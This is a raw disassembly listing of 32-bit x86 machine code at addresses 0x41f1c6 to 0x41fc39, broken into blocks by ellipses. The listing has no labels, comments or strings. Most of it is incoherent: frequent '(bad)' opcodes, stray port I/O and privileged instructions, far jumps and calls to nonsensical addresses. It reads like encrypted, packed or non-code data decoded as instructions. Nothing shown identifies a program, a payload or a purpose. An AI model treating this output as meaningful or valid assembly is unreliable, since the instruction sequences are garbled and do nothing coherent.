  41f1c6:	bound  ecx,QWORD PTR [ebx-0x6295e4a6]
  41f1cc:	sub    BYTE PTR [esi],0x87
  41f1cf:	arpl   WORD PTR [esi+0x75ace6e8],cx
  41f1d5:	xchg   DWORD PTR [esi+0x20],edx
  41f1d8:	cdq    
  41f1d9:	sbb    cl,bh
  41f1db:	mov    al,ds:0x1a90086f
  41f1e0:	adc    BYTE PTR [ecx-0x35223f93],dl
  41f1e6:	xor    eax,0x688d7c7d
  41f1eb:	push   ss
  41f1ec:	jb     0x41f184
  41f1ee:	or     BYTE PTR [edx],al
  41f1f0:	sbb    BYTE PTR [edi+0x1fa2f165],0x9d
  41f1f7:	dec    esi
  41f1f8:	pop    ebp
  41f1f9:	imul   esp,DWORD PTR [ecx+0x21],0xfffffff4
  41f1fd:	out    dx,eax
  41f1fe:	mov    al,ds:0xc6c72868
  41f203:	pop    ss
  41f204:	les    edi,FWORD PTR [ebx-0xb]
  41f207:	xchg   esp,eax
  41f208:	cmc    
  41f209:	add    al,0x20
  41f20b:	inc    edi
  41f20c:	scas   al,BYTE PTR es:[edi]
  41f20d:	fcmovb st,st(4)
  41f20f:	and    BYTE PTR [eax-0x14114242],cl
  41f215:	mov    BYTE PTR [eax],ah
  41f217:	in     eax,0x11
  41f219:	push   eax
  41f21a:	adc    esp,DWORD PTR [edi+0x637bd936]
  41f220:	or     DWORD PTR [esi+0x73],esi
  41f223:	mov    bl,0xe0
  41f225:	enter  0x56c0,0x69
  41f229:	out    0xd3,eax
  41f22b:	lock xor BYTE PTR [eax],bh
  41f22e:	int    0x64
  41f230:	mov    bh,0xbb
  41f232:	out    dx,eax
  41f233:	jno    0x41f299
  41f235:	lock adc DWORD PTR [edi-0x7fabcad4],0xdbaaaf3f
  41f240:	data16 (bad) [ebp-0x1c]
  41f244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f245:	pusha  
  41f246:	add    DWORD PTR [ecx+ecx*1+0x26],ecx
  41f24a:	mov    eax,0x206fb77c
  41f24f:	sbb    BYTE PTR [edi-0x5f4a2872],bh
  41f255:	pop    eax
  41f256:	jnp    0x41f247
  41f258:	mov    ebx,0x8f49b8b7
  41f25d:	xor    eax,0x4fe5f465
  41f262:	xor    esi,ebp
  41f264:	stc    
  41f265:	dec    edi
  41f266:	lds    eax,FWORD PTR [eax+0x55]
  41f269:	adc    al,0x1f
  41f26b:	fbstp  TBYTE PTR [edx+ebx*8+0x73]
  41f26f:	inc    ebp
  41f270:	lock jae 0x41f29f
  41f273:	sub    BYTE PTR [edx+0x2a98c57c],cl
  41f279:	into   
  41f27a:	pop    ss
  41f27b:	test   BYTE PTR [ebp+0x65],bl
  41f27e:	jne    0x41f281
  41f280:	imul   ebx,DWORD PTR [edx+0x59b809ba],0xd41e751
  41f28a:	cdq    
  41f28b:	icebp  
  41f28c:	aam    0xf6
  41f28e:	pcmpeqw mm0,mm0
	...
  41f2f1:	add    BYTE PTR [eax],al
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2c9
  41f301:	xchg   edi,eax
  41f302:	jbe    0x41f345
  41f304:	xor    al,0x4c
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0x87000001
  41f30d:	xchg   edi,eax
  41f30e:	out    0x53,eax
  41f310:	inc    esp
  41f311:	aad    0x72
  41f313:	hlt    
  41f314:	cmp    eax,0x48dd8b92
  41f319:	sbb    edi,ebx
  41f31b:	adc    BYTE PTR [ecx+0x62],dl
  41f31e:	fwait
  41f31f:	inc    edx
  41f320:	in     al,0x5a
  41f322:	adc    eax,0x2a2f6a36
  41f327:	add    al,0xfa
  41f329:	add    edi,esi
  41f32b:	xchg   BYTE PTR ss:[eax],bh
  41f32e:	in     eax,dx
  41f32f:	mov    ds:0xd0aeb37f,eax
  41f334:	(bad)
  41f337:	xchg   edx,eax
  41f338:	sub    DWORD PTR [esi],esi
  41f33a:	mov    al,0x7b
  41f33c:	mov    ?,WORD PTR [edx-0x78e1a010]
  41f342:	jb     0x41f2c5
  41f344:	jmp    0xf891:0xf69ae1f8
  41f34b:	xchg   edi,eax
  41f34c:	jge    0x41f3cb
  41f34e:	mov    ds:0x29f1bcb,al
  41f353:	cdq    
  41f354:	clc    
  41f355:	sub    esp,DWORD PTR [ecx-0x6d111e66]
  41f35b:	add    eax,0xab1d8d2
  41f360:	lock shl DWORD PTR [edx+ecx*4-0x6c82360c],cl
  41f368:	and    ecx,ecx
  41f36a:	scas   al,BYTE PTR es:[edi]
  41f36b:	sub    BYTE PTR [esi+eiz*1+0xa],0xf6
  41f370:	and    DWORD PTR [esp+eiz*2],0x13
  41f374:	mov    ecx,0x5ee8ce92
  41f379:	cmp    bh,ch
  41f37b:	cmp    al,0x2d
  41f37d:	mov    esi,0xd0fa5641
  41f382:	ss xchg dl,ah
  41f385:	push   edi
  41f386:	mov    eax,ds:0x4040f358
  41f38b:	mov    esp,0x52776c4e
  41f390:	pop    edx
  41f391:	int3   
  41f392:	loop   0x41f3c0
  41f394:	push   eax
  41f395:	test   DWORD PTR [esp+edi*2-0x5e],0x354d31dc
  41f39d:	mov    edi,DWORD PTR [edi-0x753fc623]
  41f3a3:	out    0x78,al
  41f3a5:	and    BYTE PTR [edx-0x48876d19],bl
  41f3ab:	sbb    esp,DWORD PTR [edx-0xaac9a35]
  41f3b1:	and    ch,BYTE PTR [esi+0x20]
  41f3b4:	sbb    eax,0x7691d6d8
  41f3b9:	cld    
  41f3ba:	pop    ebp
  41f3bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3bc:	push   ebx
  41f3bd:	popf   
  41f3be:	cdq    
  41f3bf:	dec    ebp
  41f3c0:	add    eax,0x768fec5a
  41f3c5:	or     eax,DWORD PTR [ecx+eiz*1+0x38]
  41f3c9:	repnz push ds
  41f3cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3cc:	sbb    al,0x3b
  41f3ce:	sub    bl,BYTE PTR [edi]
  41f3d0:	dec    esi
  41f3d1:	sbb    BYTE PTR [edi],0x75
  41f3d4:	add    eax,0xa3c2e0b8
  41f3d9:	sbb    al,0xfa
  41f3db:	jne    0x41f407
  41f3dd:	aad    0xc
  41f3df:	pop    ebx
  41f3e0:	popf   
  41f3e1:	fild   QWORD PTR [esi+0x2732ab9b]
  41f3e7:	call   0x6226ed1c
  41f3ec:	sbb    BYTE PTR [esi+esi*8+0x59],ch
  41f3f0:	aaa    
  41f3f1:	or     BYTE PTR [esi+0x9],al
  41f3f4:	call   0xbd889b8c
  41f3f9:	xchg   edx,eax
  41f3fa:	in     eax,0x2b
  41f3fc:	cld    
  41f3fd:	aas    
  41f3fe:	mov    ds:0xb5a6e855,eax
  41f403:	popf   
  41f404:	adc    eax,0x2218e1ad
  41f409:	les    ecx,FWORD PTR [ecx-0x7063df49]
  41f40f:	ss push esp
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x4
  41f481:	ucomiss xmm0,DWORD PTR [edx]
  41f484:	cmp    DWORD PTR [ebp+0x1],ecx
  41f487:	add    BYTE PTR ds:0x8a000001,al
  41f48d:	pop    edx
  41f48e:	pop    ecx
  41f48f:	push   0x1e336cdc
  41f494:	and    cl,bh
  41f496:	mov    edx,0xa1b2a299
  41f49b:	out    0xee,eax
  41f49d:	pop    edi
  41f49e:	(bad)  
  41f49f:	cmp    eax,0x3fe3c6a1
  41f4a4:	pop    edx
  41f4a5:	aaa    
  41f4a6:	inc    esp
  41f4a7:	pusha  
  41f4a8:	repnz inc eax
  41f4aa:	mov    edx,0xf2dd1833
  41f4af:	or     eax,0xb5478e7
  41f4b4:	sub    esp,DWORD PTR [eax]
  41f4b6:	sbb    al,0x18
  41f4b8:	hlt    
  41f4b9:	lods   eax,DWORD PTR ds:[esi]
  41f4ba:	push   esp
  41f4bb:	sbb    ecx,DWORD PTR [eax]
  41f4bd:	lods   al,BYTE PTR ds:[esi]
  41f4be:	and    eax,0x562c8c8e
  41f4c3:	pop    eax
  41f4c4:	dec    edx
  41f4c5:	push   ebp
  41f4c6:	aam    0xe5
  41f4c8:	push   cs
  41f4c9:	rol    BYTE PTR [ecx-0x345c431],0x81
  41f4d0:	cmp    al,al
  41f4d2:	fistp  QWORD PTR ds:0x29c2143d
  41f4d8:	sbb    eax,0x2820c114
  41f4dd:	add    eax,0xb823a728
  41f4e2:	adc    al,0x3c
  41f4e4:	cld    
  41f4e5:	jg     0x41f55a
  41f4e7:	outs   dx,BYTE PTR ds:[esi]
  41f4e8:	adc    al,0x6e
  41f4eb:	push   eax
  41f4ec:	rol    esi,0x7d
  41f4ef:	jg     0x41f50b
  41f4f1:	int3   
  41f4f2:	test   eax,0xda8550e7
  41f4f7:	pop    ds
  41f4f8:	jge    0x41f4e0
  41f4fa:	pop    ds
  41f4fb:	push   edx
  41f4fc:	sar    BYTE PTR cs:[ebp+0x5d],0x1a
  41f501:	out    dx,eax
  41f502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f503:	repz fbstp TBYTE PTR [ebx]
  41f506:	lods   eax,DWORD PTR ds:[esi]
  41f507:	sub    al,0x30
  41f509:	xchg   edi,eax
  41f50a:	out    0xd3,eax
  41f50c:	mov    al,ds:0x896f3702
  41f511:	xor    DWORD PTR [eax-0x4f750d94],eax
  41f517:	pop    esi
  41f518:	test   eax,0x591f1da1
  41f51d:	sbb    al,0x5f
  41f51f:	popf   
  41f520:	nop
  41f521:	jo     0x41f56a
  41f523:	ss adc eax,0x76f4ffb7
  41f529:	sbb    eax,0xefc74ca5
  41f52e:	shl    BYTE PTR ds:0x6413e406,0x15
  41f535:	fidiv  DWORD PTR [edx]
  41f538:	inc    ebx
  41f539:	jb     0x41f568
  41f53b:	jno    0x41f5ad
  41f53d:	daa    
  41f53e:	mov    ah,0xb6
  41f540:	enter  0x6b35,0x6b
  41f544:	shr    BYTE PTR [esi+0x1c],0x60
  41f548:	sub    DWORD PTR [eax],edx
  41f54a:	push   0xa41ccee4
  41f54f:	repnz fistp QWORD PTR [ebp+0x53]
  41f554:	and    DWORD PTR [edx*2-0x620f9ae3],ebx
  41f55b:	cmp    DWORD PTR ds:0x28e39046,edx
  41f561:	fbstp  TBYTE PTR [edi]
  41f563:	test   al,0xb8
  41f565:	jp     0x41f58b
  41f567:	cmp    al,0xbb
  41f569:	add    dl,dh
  41f56b:	jne    0x41f523
  41f56d:	dec    ecx
  41f56e:	push   cs
  41f56f:	(bad)  
  41f570:	adc    ch,dl
  41f572:	loopne 0x41f528
  41f574:	mov    bh,0x6c
  41f576:	sbb    eax,0x1153947c
  41f57b:	(bad)  
  41f57c:	adc    ebp,esi
  41f57e:	xchg   BYTE PTR [ebx+0x11],ch
  41f581:	mov    esp,0xa67b7f37
  41f586:	scas   al,BYTE PTR es:[edi]
  41f587:	mov    ebp,0x11232f0d
  41f58c:	mov    ebx,0x9c5ce1b8
	...
  41f5f1:	add    BYTE PTR [eax],al
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x99eb:0x27fdd422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x82000001
  41f60d:	repnz stc 
  41f60f:	je     0x41f5f7
  41f611:	cmp    esp,DWORD PTR [edi]
  41f613:	sar    BYTE PTR [ecx+0x48],cl
  41f616:	shr    DWORD PTR ds:0x6686cc28,1
  41f61c:	loop   0x41f619
  41f61e:	and    BYTE PTR [ecx-0x7689f552],dh
  41f624:	call   0x49c894f4
  41f629:	shl    DWORD PTR [edi+0xd23ebb1],cl
  41f62f:	js     0x41f66b
  41f631:	cwde   
  41f632:	adc    dl,dh
  41f634:	test   al,0x99
  41f636:	fistp  DWORD PTR [edx-0x2b]
  41f639:	aaa    
  41f63a:	add    cl,BYTE PTR [esi+esi*2+0x27349460]
  41f641:	int3   
  41f642:	icebp  
  41f643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f644:	inc    ebp
  41f645:	mov    eax,0x1fb5a800
  41f64a:	adc    eax,0x6dbf3bb4
  41f64f:	mov    ds:0x834ad047,al
  41f654:	lock test cl,bh
  41f657:	fidivr DWORD PTR [esi+ecx*1+0x7b]
  41f65b:	stos   DWORD PTR es:[edi],eax
  41f65c:	sbb    cl,0x67
  41f65f:	mov    dl,0xf8
  41f661:	out    dx,al
  41f662:	jno    0x41f63d
  41f664:	sbb    eax,0x621ec1b
  41f669:	inc    ecx
  41f66a:	sub    al,0xf6
  41f66c:	xor    DWORD PTR [ebp+0x55],ebx
  41f66f:	dec    ebx
  41f670:	fistp  WORD PTR [edi]
  41f672:	sbb    DWORD PTR [ebx],0xffffffdb
  41f675:	(bad)  
  41f676:	pop    ds
  41f677:	xchg   BYTE PTR [edx],al
  41f679:	pop    esi
  41f67a:	sub    BYTE PTR [eax],dh
  41f67c:	mov    eax,0x479cff96
  41f681:	mov    ecx,0x2b78b3fc
  41f686:	aaa    
  41f687:	test   DWORD PTR [eax-0x24d04c12],edx
  41f68d:	cld    
  41f68e:	add    ebx,esi
  41f690:	push   ss
  41f691:	adc    eax,0x9f5928ca
  41f696:	fisub  WORD PTR [edi]
  41f698:	mov    WORD PTR [edi],fs
  41f69a:	out    0x94,al
  41f69c:	mov    edx,0x10baa4d8
  41f6a1:	pop    eax
  41f6a2:	bound  edi,QWORD PTR [edx-0x9d6786d]
  41f6a8:	add    BYTE PTR ds:0x437322a1,0xa7
  41f6af:	scas   eax,DWORD PTR es:[edi]
  41f6b0:	or     ebx,eax
  41f6b2:	les    esp,FWORD PTR [ecx+eiz*2]
  41f6b5:	inc    ecx
  41f6b6:	leave  
  41f6b7:	push   ebx
  41f6b8:	mov    WORD PTR [edi+0x6b],?
  41f6bb:	pop    edx
  41f6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6bd:	and    BYTE PTR ds:0x95f3f6fc,ch
  41f6c3:	or     dh,BYTE PTR [eax-0x3f7d3a49]
  41f6c9:	push   cs
  41f6ca:	xor    eax,0x77ad497c
  41f6cf:	jle    0x41f6f7
  41f6d1:	repnz and esi,ebp
  41f6d4:	xor    dh,BYTE PTR [ecx+0x275c78b1]
  41f6da:	xor    eax,0x84c55e0
  41f6df:	pop    ecx
  41f6e0:	cwde   
  41f6e1:	out    0x7c,eax
  41f6e3:	hlt    
  41f6e4:	jl     0x41f6ad
  41f6e6:	mov    DWORD PTR [esi-0x39e61bd3],0x1b7eed6
  41f6f0:	and    DWORD PTR [edx],0x53
  41f6f3:	push   esp
  41f6f4:	ins    BYTE PTR es:[edi],dx
  41f6f5:	mov    BYTE PTR [eax+0x7],0x69
  41f6f9:	mov    ch,0x11
  41f6fb:	xor    DWORD PTR [eax-0x9320db4],ebx
  41f701:	jno    0x41f6a3
  41f703:	sbb    dh,BYTE PTR [eax]
  41f705:	dec    eax
  41f706:	jge    0x41f69f
  41f708:	sahf   
  41f709:	push   ebx
  41f70a:	add    DWORD PTR [ecx],0xc31ec188
  41f710:	fild   WORD PTR [eax]
	...
  41f772:	add    BYTE PTR [eax],al
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x4bd3:0xfc6c62d2
  41f783:	fiadd  DWORD PTR [ebx+0x4f]
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0x51000001
  41f78d:	mov    al,0xbf
  41f78f:	adc    al,0x2c
  41f791:	mov    ebp,0xd92f580e
  41f796:	sub    bl,BYTE PTR [ecx-0x5edbe4f0]
  41f79c:	fnstcw WORD PTR [ecx-0x3216aa15]
  41f7a2:	cld    
  41f7a3:	lods   al,BYTE PTR ds:[esi]
  41f7a4:	dec    ecx
  41f7a5:	xchg   ebx,eax
  41f7a6:	sbb    al,0x93
  41f7a8:	adc    eax,0x5bf4be9f
  41f7ad:	push   0x1f
  41f7af:	(bad)  
  41f7b1:	push   ebx
  41f7b2:	dec    ah
  41f7b4:	lods   al,BYTE PTR ds:[esi]
  41f7b5:	inc    BYTE PTR [edx+0x624a7d8]
  41f7bb:	sar    DWORD PTR [ebx+0x5b20723b],1
  41f7c1:	dec    edi
  41f7c2:	icebp  
  41f7c3:	mov    al,0x64
  41f7c5:	in     al,0x9c
  41f7c7:	rcr    ebp,cl
  41f7c9:	mov    eax,DWORD PTR [ebp-0x22]
  41f7cc:	fwait
  41f7cd:	jbe    0x41f7ea
  41f7cf:	sbb    al,0x5a
  41f7d1:	cmc    
  41f7d2:	sbb    BYTE PTR [esi+esi*1-0x48],dh
  41f7d6:	jmp    0x4017d742
  41f7db:	xchg   ebp,eax
  41f7dc:	lods   eax,DWORD PTR ds:[esi]
  41f7dd:	dec    eax
  41f7de:	dec    edi
  41f7df:	fwait
  41f7e0:	jle    0x41f860
  41f7e2:	fstp   DWORD PTR [ebx+0x2b]
  41f7e5:	mov    ch,0x70
  41f7e7:	daa    
  41f7e8:	iret   
  41f7e9:	lods   al,BYTE PTR ds:[esi]
  41f7ea:	cmp    eax,0xcffb097a
  41f7ef:	loopne 0x41f7c3
  41f7f1:	inc    eax
  41f7f2:	cli    
  41f7f3:	ins    BYTE PTR es:[edi],dx
  41f7f4:	lds    esp,FWORD PTR [ebp-0x7a259f15]
  41f7fa:	rcl    DWORD PTR [esi],1
  41f7fc:	fs lock and eax,0x89449c6
  41f803:	xor    al,0xac
  41f805:	mov    BYTE PTR [eax+0x476204d],bl
  41f80b:	dec    ecx
  41f80c:	lds    ebp,FWORD PTR [ebx-0x7cefef5e]
  41f812:	or     DWORD PTR [edi+0x51],esp
  41f815:	adc    bl,BYTE PTR [ecx+0x7565c265]
  41f81b:	add    dl,dh
  41f81d:	push   ss
  41f81e:	jae    0x41f86a
  41f820:	add    ch,BYTE PTR [esi-0xab06491]
  41f826:	mov    bh,0x85
  41f828:	add    BYTE PTR ds:0xa0a2f6d7,dh
  41f82e:	mov    al,0x3b
  41f830:	scas   al,BYTE PTR es:[edi]
  41f831:	or     dh,BYTE PTR [eax+eax*4-0x2f90aed0]
  41f838:	nop
  41f839:	dec    ebp
  41f83a:	add    DWORD PTR [edi],ecx
  41f83c:	pop    ecx
  41f83d:	lods   eax,DWORD PTR ds:[esi]
  41f83e:	jo     0x41f8b7
  41f840:	dec    edx
  41f841:	out    0xc0,al
  41f843:	pop    ss
  41f844:	sub    DWORD PTR [esi+0x4cd4a3d3],0xffffffec
  41f84b:	pop    ebx
  41f84c:	add    eax,0x41ff770a
  41f851:	bound  ebx,QWORD PTR [edx+eax*4+0x493a5278]
  41f858:	fld    TBYTE PTR [esp+0x77bd7607]
  41f85f:	or     eax,0xb675ee21
  41f864:	mov    bh,0x84
  41f866:	and    al,0xe3
  41f868:	nop
  41f869:	and    edi,DWORD PTR [edx+0x317f8d81]
  41f86f:	and    al,0x5a
  41f871:	int    0xed
  41f873:	loopne 0x41f8a1
  41f875:	xchg   DWORD PTR [ebp+0x7],ebx
  41f878:	ror    DWORD PTR [eax+0x1c888615],0x57
  41f87f:	and    edi,DWORD PTR [eax+0x13b1258a]
  41f885:	adc    eax,DWORD PTR [eax]
  41f887:	push   edi
  41f888:	retf   
  41f889:	dec    edx
  41f88a:	sahf   
  41f88b:	gs fwait
  41f88d:	pop    edi
  41f88e:	sbb    DWORD PTR [ecx+0x3d],eax
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	daa    
  41f901:	jb     0x41f8c7
  41f903:	loop   0x41f94d
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0xf3000001
  41f90d:	pusha  
  41f90e:	test   DWORD PTR [ebx+0x2f34fd57],esi
  41f914:	jb     0x41f957
  41f916:	or     ecx,edi
  41f918:	sub    BYTE PTR [ecx+0xe],0x2f
  41f91c:	mov    edi,DWORD PTR [ebp-0x46]
  41f91f:	aad    0x76
  41f921:	pop    es
  41f922:	inc    edx
  41f923:	fstp   DWORD PTR [edx-0x60]
  41f926:	mov    es,WORD PTR [esi+eiz*2-0x1daafd51]
  41f92d:	push   ecx
  41f92e:	jmp    0x41f8d6
  41f930:	std    
  41f931:	ror    DWORD PTR [edi+0x7bd5d077],0x4b
  41f938:	adc    ebp,DWORD PTR [esi]
  41f93a:	push   edx
  41f93b:	mov    cl,0x7a
  41f93d:	fnstenv [edi]
  41f93f:	mov    cl,0x33
  41f941:	leave  
  41f942:	fdivr  DWORD PTR [ebx-0x63ce2e3]
  41f948:	imul   edx,DWORD PTR [ebx+0x48],0xffffffc8
  41f94c:	in     al,dx
  41f94d:	test   eax,0x1efacaca
  41f952:	mov    ebp,0xf3382049
  41f957:	fimul  WORD PTR ds:[esi+0x2416f6eb]
  41f95e:	(bad)  
  41f95f:	rol    DWORD PTR [eax-0xb],1
  41f962:	dec    ebp
  41f963:	ret    0x5659
  41f966:	pop    ecx
  41f967:	lds    ebp,FWORD PTR [ecx-0x74]
  41f96a:	jg     0x41f94d
  41f96c:	rol    DWORD PTR [ecx],1
  41f96e:	hlt    
  41f96f:	lock stos DWORD PTR es:[edi],eax
  41f971:	pop    es
  41f972:	iret   
  41f973:	sub    ecx,DWORD PTR [edi]
  41f975:	fcom   QWORD PTR [edx-0x17]
  41f978:	outs   dx,BYTE PTR ds:[esi]
  41f979:	(bad)
  41f97e:	jbe    0x41f9d2
  41f980:	jmp    0x8b895c2c
  41f985:	jbe    0x41f95f
  41f987:	es fs xchg ebx,eax
  41f98a:	imul   eax,DWORD PTR [ecx],0x31
  41f98d:	mov    al,0x1c
  41f98f:	cmp    edx,DWORD PTR [edi-0x595dfd48]
  41f995:	rol    ch,cl
  41f997:	pop    eax
  41f998:	loope  0x41f9ef
  41f99a:	ss jg  0x41f9d6
  41f99d:	pop    ss
  41f99e:	and    al,0xf8
  41f9a0:	das    
  41f9a1:	jmp    0x41f9c5
  41f9a3:	lods   al,BYTE PTR ds:[esi]
  41f9a4:	push   cs
  41f9a5:	imul   edx,DWORD PTR [esi],0xe3f8dd72
  41f9ab:	add    DWORD PTR [ecx+0x5c],ecx
  41f9ae:	mov    cs,WORD PTR [edx+0x6e]
  41f9b1:	sub    eax,0xc84e0907
  41f9b6:	adc    bh,BYTE PTR [edx-0x20948c8e]
  41f9bc:	mov    ebx,0x9c6ce7df
  41f9c1:	aaa    
  41f9c2:	nop
  41f9c3:	and    esp,DWORD PTR [ecx+0x3d88b63b]
  41f9c9:	retf   
  41f9ca:	add    eax,0xd4cb6dc9
  41f9cf:	fcmovnbe st,st(2)
  41f9d1:	dec    edi
  41f9d2:	int3   
  41f9d3:	hlt    
  41f9d4:	fdiv   DWORD PTR [ebp-0x5c]
  41f9d7:	jmp    0x5750e13b
  41f9dc:	sbb    dh,BYTE PTR [eax+0x5b683583]
  41f9e2:	test   BYTE PTR ds:0x2c16f852,bl
  41f9e8:	leave  
  41f9e9:	mov    al,0xc8
  41f9eb:	call   0x699c:0x4e67b234
  41f9f2:	lds    ebp,FWORD PTR [edx+ebx*4-0x35]
  41f9f6:	inc    edx
  41f9f7:	shl    DWORD PTR [ebp-0x73d9cbb5],cl
  41f9fd:	ja     0x41fa2d
  41f9ff:	retf   0x4256
  41fa02:	or     eax,0x8540e8e3
  41fa07:	pop    esi
  41fa08:	pop    esp
  41fa09:	xchg   ebp,eax
  41fa0a:	sub    esi,DWORD PTR ds:0x3c84efdd
  41fa10:	mov    ds:0x0,al
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0xd7a6a415,eax
  41fa83:	mov    ebp,0x1514d
  41fa88:	add    eax,0xa8000001
  41fa8d:	mov    ecx,ebx
  41fa8f:	jno    0x41fa19
  41fa91:	xor    al,BYTE PTR [esi+0x56]
  41fa94:	mov    esp,0x74033acb
  41fa99:	mov    ch,BYTE PTR [edi+0x5a]
  41fa9c:	bound  edx,QWORD PTR [esi+0x4f]
  41fa9f:	out    0xb,al
  41faa1:	jns    0x41fa3e
  41faa3:	pop    ecx
  41faa4:	add    BYTE PTR [esi-0x6f69c0b],0x2a
  41faab:	mov    ch,0x36
  41faad:	inc    eax
  41faae:	or     BYTE PTR [esi],al
  41fab0:	mov    cs,ebx
  41fab2:	dec    edi
  41fab3:	push   0xfffffff6
  41fab5:	mov    edi,0x243b6a0a
  41faba:	cmp    BYTE PTR [ebx-0x43],cl
  41fabd:	xlat   BYTE PTR ds:[ebx]
  41fabe:	or     ecx,DWORD PTR ds:0xc27b932
  41fac4:	add    al,0xca
  41fac6:	mov    edx,0x6c22c884
  41facb:	test   DWORD PTR [edi+ebp*4-0x35a71e99],ecx
  41fad2:	adc    DWORD PTR [esi-0x6b],ebx
  41fad5:	std    
  41fad6:	adc    ch,BYTE PTR [esi-0x7d]
  41fad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fada:	or     DWORD PTR [edi+ecx*2+0x2e],0xfffffffc
  41fadf:	or     DWORD PTR [ebp-0x4f16a352],0xffffffd4
  41fae6:	push   edx
  41fae7:	mov    ecx,0xcba0115f
  41faec:	sbb    esi,edx
  41faee:	scas   eax,DWORD PTR es:[edi]
  41faef:	std    
  41faf0:	sub    al,0xea
  41faf2:	mov    bl,0xa1
  41faf4:	outs   dx,BYTE PTR ds:[esi]
  41faf5:	xor    eax,0xe2424cea
  41fafa:	sub    eax,0x5b73dcce
  41faff:	sbb    ah,0x5b
  41fb02:	inc    ebp
  41fb03:	mov    cl,0xab
  41fb05:	js     0x41fafe
  41fb07:	jns    0x41faa2
  41fb09:	inc    ebx
  41fb0a:	jmp    0x9def2071
  41fb0f:	pop    edx
  41fb10:	mov    esi,0xe93e5d40
  41fb15:	sbb    edi,DWORD PTR [ebp-0x15f32dd1]
  41fb1b:	jle    0x41fb8c
  41fb1d:	mov    WORD PTR [ebp-0x5584b20],?
  41fb23:	gs push edx
  41fb25:	mov    ch,BYTE PTR [ecx]
  41fb27:	scas   al,BYTE PTR es:[edi]
  41fb28:	pop    es
  41fb29:	outs   dx,BYTE PTR ds:[esi]
  41fb2a:	imul   ebp,DWORD PTR [ebx],0xeec746c
  41fb30:	loop   0x41fb1a
  41fb32:	xchg   DWORD PTR [ecx+0x2d8db298],ecx
  41fb38:	arpl   WORD PTR [ebx-0x47],bx
  41fb3b:	dec    esp
  41fb3c:	gs loope 0x41fb43
  41fb3f:	push   esp
  41fb40:	push   es
  41fb41:	jg     0x41fb3b
  41fb43:	xchg   BYTE PTR [esi-0x389be3b2],ah
  41fb49:	adc    ebp,DWORD PTR [ecx+0x47]
  41fb4c:	in     al,dx
  41fb4d:	add    DWORD PTR [edx],eax
  41fb4f:	adc    al,0xe0
  41fb51:	retf   0x7ac2
  41fb54:	adc    al,0x1a
  41fb56:	mov    BYTE PTR [ecx+0x70],dl
  41fb59:	sub    ah,BYTE PTR [eax]
  41fb5b:	frstor [ecx-0x2cd8e61f]
  41fb61:	sub    BYTE PTR [ebx],ah
  41fb63:	mov    DWORD PTR [esi],eax
  41fb65:	mul    ebp
  41fb67:	js     0x41fb3e
  41fb69:	(bad)  
  41fb6a:	out    dx,eax
  41fb6b:	adc    al,0x45
  41fb6d:	mov    eax,0xfaf8a0bb
  41fb72:	push   ebp
  41fb73:	cld    
  41fb74:	xor    BYTE PTR [eax],dh
  41fb76:	mov    BYTE PTR [edx],dl
  41fb78:	push   eax
  41fb79:	cmc    
  41fb7a:	daa    
  41fb7b:	jne    0x41fbbd
  41fb7d:	loope  0x41fbb2
  41fb7f:	sub    ecx,DWORD PTR [edi+0x2b]
  41fb82:	add    eax,0x14cc5590
  41fb87:	rcr    DWORD PTR [eax+0x2c],0x89
  41fb8b:	or     BYTE PTR [esi+0x25],al
  41fb8e:	sbb    eax,0xc992
	...
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	stos   DWORD PTR es:[edi],eax
  41fc01:	xchg   esp,eax
  41fc02:	and    al,0x8e
  41fc04:	push   edx
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0x79000001
  41fc0d:	or     DWORD PTR [esi-0x5c],0x63
  41fc11:	fidivr WORD PTR [edi+eax*2]
  41fc14:	mov    esi,ss
  41fc16:	idiv   BYTE PTR [esi]
  41fc18:	jae    0x41fbee
  41fc1a:	fwait
  41fc1b:	mov    ebx,0x2f836e41
  41fc20:	aad    0x64
  41fc22:	aam    0x90
  41fc24:	mov    DWORD PTR ds:0x6b07d1d,edx
  41fc2a:	(bad)  
  41fc2b:	int3   
  41fc2c:	dec    BYTE PTR [esi-0x512bcf5a]
  41fc32:	stc    
  41fc33:	adc    dl,BYTE PTR ds:0x8a5229dc
  41fc39:	retf   
